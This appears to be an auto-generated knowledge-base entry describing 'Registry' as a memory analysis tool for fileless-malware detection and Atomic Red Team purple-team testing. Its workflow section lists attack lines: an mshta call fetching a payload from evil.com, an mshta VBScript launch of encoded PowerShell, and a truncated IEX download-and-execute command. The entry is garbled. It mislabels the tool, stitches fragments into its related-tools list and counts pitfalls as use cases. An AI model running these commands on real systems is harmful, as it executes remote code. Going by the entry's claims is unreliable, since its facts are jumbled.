# Registry

## Overview
Registry is a memory analysis tool that appears across malware analysis workflows in this knowledge base. It is referenced as part of higher-level security analysis, investigation, monitoring, or validation activity rather than as an end in itself.

## What It Is
Registry is best understood as a malware-analysis tool in this knowledge base. Its role is conceptual and system-facing rather than procedural: it gives analysts or defenders a structured way to examine evidence, model system behavior, or reason about security state.

## How It Works
Registry works by turning technical inputs into more interpretable outputs at the system level. Across the source skills, it appears as part of larger analysis, investigation, monitoring, or validation loops rather than as a standalone end state.

## Core Concepts
- malware
- fileless
- LOLBins
- memory analysis
- detection
- malware analysis
- purple team
- atomic red team
- mitre attack
- detection engineering
- adversary emulation

## Typical Workflow
- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Abuse: Execute HTA files with embedded VBScript/JScript
- Example: mshta http://evil.com/payload.hta
- Example: mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ...""")
- Abuse: Load scriptlets via COM (.sct files) - "Squiblydoo"
- Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force
- Install-Module -Name powershell-yaml -Scope CurrentUser -Force
- Import-Module invoke-atomicredteam
- IEX (IEX (New-Object System.Net.WebClient).DownloadString(
- 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'

## Use Cases
- EDR alerts indicate suspicious behavior from trusted system binaries (PowerShell, mshta, wmic, regsvr32)
- Investigating attacks that leave no traditional malware files on disk
- Analyzing WMI event subscriptions, registry-stored payloads, or scheduled task abuse for persistence
- Building detection rules for LOLBin (Living Off the Land Binary) abuse in enterprise environments
- Memory forensics reveals malicious code but no corresponding files exist on the filesystem
- Rebooting the system before capturing a memory dump (destroys in-memory evidence)
- Focusing only on file-based IOCs when the attack is entirely fileless
- Validating detection coverage against specific MITRE ATT&CK techniques
- Running purple team exercises using Atomic Red Team test library
- Performing ATT&CK coverage gap analysis to identify blind spots in SIEM/EDR

## Limitations
- Output still depends on context, data quality, and surrounding analysis.
- The tool should be interpreted as part of a broader workflow, not as a complete answer by itself.
- Capabilities and visibility vary depending on environment, integrations, and available inputs.

## Related Tools
- Sysmon, And Coverage Over Time, And File Telemetry, And Fileless Malware Artifacts, And Network Connections, And Process Activity For Observing Fileless Attack Behavior, And Registry Entries, Atomic Red Team Atomics

## Sources
- detecting-fileless-malware-techniques
- performing-purple-team-atomic-testing
